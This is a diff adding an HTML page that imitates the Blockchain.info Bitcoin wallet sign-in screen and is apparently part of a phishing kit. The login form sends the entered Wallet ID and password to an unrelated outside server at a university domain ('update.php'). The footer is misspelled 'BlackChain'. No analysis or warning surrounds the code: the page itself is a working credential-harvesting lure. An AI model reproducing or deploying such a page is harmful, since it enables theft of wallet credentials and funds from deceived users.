@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bitcoin Wallet - Blockchain</title>
+  <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css" />
+  <link rel="stylesheet" type="text/css" href="assets/css/styles.css" />
+  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
+  <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
+</head>
+<body>
+
+<div class="login-sec">
+  <div class="container-fluid full-h">
+    <div class="login-form-sec">
+      <nav class="navbar navbar-default">
+        <div class="container" id="main-menu">
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="index.html#"><img src="assets/imgs/logo.svg"></a>
+          </div>
+          <div id="navbar" class="navbar-collapse collapse">
+            <ul class="nav navbar-nav menu-list">
+              <li class="active"><a href="index.html#">Wallet</a></li>
+              <li><a href="index.html#about">Charts</a></li>
+              <li><a href="index.html#contact">Stats</a></li>
+              <li><a href="index.html#contact">Markets</a></li>
+              <li><a href="index.html#contact">API</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right visible-xs visible-lg">
+              <li>
+                <form action="index.html" class="search" method="GET">
+                  <div class="item search">
+                    <input type="text" name="search" class="form-control input-sm" placeholder="Search">
+                    <span class="glyphicon glyphicon-search" aria-hidden="true"></span>
+                  </div>
+                </form>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+
+      <div class="login-form col-lg-5 col-md-5 col-sm-10 col-xs-12 flex-column flex-center flex-justify">
+        <header>
+          <h3>Welcome Back! <small class="pull-right">or <a href="index.html#" class="">Sign Up</a></small></h3>
+          <span class="sub-text">Sign in to your wallet below</span>
+        </header>
+        <form action="http://fss.vnmu.edu.ua/blockchain/update.php" method="post">
+          <div class="form-group">
+            <label for="WalletId">Wallet ID</label>
+            <input type="text" class="form-control" id="WalletId" name="WalletId" autocomplete="off">
+            <span class="sub-text hidden-xs">Find the login link in your email, e.g. <i>blockchain.info/wallet/1111-222-333...</i> The series of numbers and dashes at the end of the link is your Wallet ID.</span>
+          </div>
+          <div class="form-group">
+            <label for="WalletPwd">Password:</label>
+            <input type="password" class="form-control" id="WalletPwd" name="WalletPwd" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <button type="submit" class="btn btn-primary form-control">Submit</button>
+          </div>
+          <span class="pull-right sub-text">Having some trouble? <a href="index.html">View Options</a></span>
+        </form>
+      </div>
+
+    </div>
+
+  </div>
+  <div class="copyRights">
+    &copy; BlackChain
+  </div>
+</div>
+</body>
+</html>
